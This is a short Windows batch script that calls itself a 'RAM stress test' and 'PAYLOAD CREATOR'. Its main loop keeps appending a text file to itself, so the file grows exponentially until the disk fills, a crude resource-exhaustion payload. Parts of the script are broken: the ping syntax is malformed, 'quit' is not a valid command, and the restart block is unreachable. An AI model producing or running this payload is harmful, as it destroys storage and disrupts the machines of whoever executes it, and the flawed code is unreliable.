@echo off
title RAM stress test [[-PAYLOAD CREATOR-]] [%random%] [%random%]
color 0f

:: MAIN
cls
:loop
type text.txt >> text.txt
PING -n 0.0 0.0.0.0 >NUL
echo Done, %random%
goto loop

:: ERROR BLOCK
:re
cls
echo something happened :v
echo.
set /p REST= Do you want to restart (y/n)?:
goto %REST%

:y
goto loop

:n
quit